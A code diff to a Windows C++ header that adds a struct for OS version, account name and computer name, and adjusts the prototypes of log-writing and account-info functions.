@@ -5,9 +5,22 @@
 #include <fstream>
 #include <sstream>
 #include <rpc.h>
+#include <lmcons.h>
 
 #include "helper.h"
 #include "encrypt.h"
+
+struct UserData { // FIXME unresolved external >:(
+  OSVERSIONINFOEX osVersionInfo;
+  char *accountName;
+  char *computerName;
+  static uint32_t activeProcess;
+
+  static uint32_t GetActiveProcess() {
+	return activeProcess;
+  }
+
+} *pUserData;
 
 namespace Stream {
 class LogFile {
@@ -26,8 +39,8 @@ class LogFile {
 std::string GetPath(const std::string &dir = "");
 bool MakeDir(const std::string &path);
 bool MakeFile();
-bool WriteLog(const std::string &input, uint32_t &active, bool blockProcessInfo = false);
-OSVERSIONINFOEX GetAccountInfo();
+bool WriteLog(const std::string &input, unsigned int active, bool blockProcessInfo = false);
+void GetAccountInfo(UserData *data);
 std::vector<std::filesystem::path> GetAllFilesInFolder(const std::string &firstFile);
 
 static Stream::LogFile *logFile;
